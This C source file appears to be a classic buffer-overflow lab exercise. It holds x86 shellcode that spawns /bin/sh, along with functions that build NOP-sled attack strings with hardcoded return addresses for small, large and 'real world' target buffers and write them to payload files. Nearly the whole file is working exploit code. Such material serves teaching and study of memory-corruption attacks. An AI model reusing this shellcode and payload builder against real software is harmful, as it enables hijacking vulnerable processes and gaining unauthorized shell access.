/** lexploit.c
  Coded by Fanping Zeng. 09/29/2013 
  To show to smash a buffer to obtain a shell.
  gcc -o lexploit ../src/lexploit.c
*/
//====================================================================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//=============================================================================
// The shellcode is to abtain a shell (/bin/sh) in the target process space.
// You can test it by ((void (*)())shellcode)().
//=============================================================================
char shellcode[]=
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
/*
 80481e0:       31 d2                   xor    %edx,%edx
 80481e2:       52                      push   %edx
 80481e3:       68 6e 2f 73 68          push   $0x68732f6e
 80481e8:       68 2f 2f 62 69          push   $0x69622f2f
 80481ed:       89 e3                   mov    %esp,%ebx
 80481ef:       52                      push   %edx
 80481f0:       53                      push   %ebx
 80481f1:       89 e1                   mov    %esp,%ecx
 80481f3:       8d 42 0b                lea    0xb(%edx),%eax
 8048419:		0f 34                	sysenter 
// 80481f6:       cd 80                   int    $0x80
*/

// You should determine the start address of the buffer through debuging the target process.
#define SMALL_BUFFER_START 0xbffff24c

// You should determine the length of the buffer through debuging the target process.
#define LBUFF_LEN 512
#define SBUFF_LEN 32

#define ATTACK_BUFF_LEN 1024
//=============================================================================
// If the target process has a small buffer( say 32 bytes),
// then you can put the shellcode at the behind of the buffer.
// The attack string looks like [RET......RET NOP......NOP shellcode NOP NOP ].
//=============================================================================
void ShellCodeSmashSmallBuf()
{
    char attackStr[ATTACK_BUFF_LEN];
    unsigned long *ps;
    FILE *badfile;
    memset(attackStr, 0x90, ATTACK_BUFF_LEN);
    strcpy(attackStr + (ATTACK_BUFF_LEN - strlen(shellcode) - 1), shellcode);
    ps = (unsigned long *)(attackStr+48);
    *(ps) = SMALL_BUFFER_START + 0x100;
    attackStr[ATTACK_BUFF_LEN-1] = 0;
    // Save the attack string for latter use.
    printf("\nSmashSmallBuf():\n\tLength of attackStr=%d RETURN=0x%p.\n"
        ,strlen(attackStr), (void *)*(ps));
    badfile = fopen("./SmashSmallBuf.bin", "w");
    fwrite(attackStr, strlen(attackStr), 1, badfile);
    fclose(badfile);
}

//=============================================================================
// If the target process has a big buffer( more than 256 bytes),
// then you can put the shellcode at the front part of the buffer.
// The attack string looks like [NOP......NOP shellcode NOP NOP RET......RET].
//=============================================================================
#define OFF_SET 528
#define LARGE_BUFFER_START 0xbfffe87c

void ShellCodeSmashLargeBuf()
{
    char attackStr[ATTACK_BUFF_LEN];
    unsigned long *ps, ulReturn;
    int i;
    FILE *badfile;
    
    // 你需要修改下列代码，以准备合适的攻击字符串，实现溢出并获得一个shell
    //================================================================
    memset(attackStr, 0x90, ATTACK_BUFF_LEN);
    strcpy(attackStr + (LBUFF_LEN - strlen(shellcode) - 1), shellcode);
    memset(attackStr+strlen(attackStr), 0x90, 1);  //
    ps = (unsigned long *)(attackStr+OFF_SET);
    *(ps) = LARGE_BUFFER_START+0x100;
    attackStr[ATTACK_BUFF_LEN - 1] = 0;
    //================================================================
    // 你需要修改上面的代码，以准备合适的攻击字符串，实现溢出并获得一个shell
	
	// Save the attack string for latter use.
    printf("\nSmashLargeBuf():\n\tLength of attackStr=%d RETURN=%p.\n",
        strlen(attackStr), (void *)(*(ps)));
	badfile = fopen("./SmashLargeBuf.bin", "w");
    fwrite(attackStr, strlen(attackStr), 1, badfile);
    fclose(badfile);
}

//=============================================================================
// If the target process has a small buffer( say 32 bytes),
// then you can put the shellcode at the behind of the buffer.
// The attack string looks like [RET......RET NOP......NOP shellcode NOP NOP ].
//=============================================================================
#define ATTACK_LEN ATTACK_BUFF_LEN*ATTACK_BUFF_LEN*2
void ShellCodeForRealWorld()
{
	char attackStr[ATTACK_LEN];
    unsigned long *ps;
    unsigned long ulReturn=0xbfdfea40 + 0x100;
	FILE *badfile;

    memset(attackStr, 0x90, ATTACK_LEN);
    strcpy(attackStr + (ATTACK_LEN - strlen(shellcode) - 1), shellcode);

    ulReturn = 0xbfdfea40 + 0x1000;
    ps = (unsigned long *)(attackStr+44);
    *(ps) = ulReturn;
    attackStr[ATTACK_LEN - 1] = 0;

	// Save the attack string for latter use.
    printf("\nSmashRealBuf():\n\tLength of attackStr=%d RETURN=%p.\n",strlen(attackStr), (void *)ulReturn);
	badfile = fopen("./SmashRealBuf.bin", "w");
	int i = fwrite(attackStr, 1, strlen(attackStr), badfile);
	fclose(badfile);
}

/* ===================================================================== */
/* Main                                                                  */
/* ===================================================================== */
void main(int argc, char * argv[])
{
	ShellCodeSmashSmallBuf();
	ShellCodeSmashLargeBuf();
	ShellCodeForRealWorld();
}

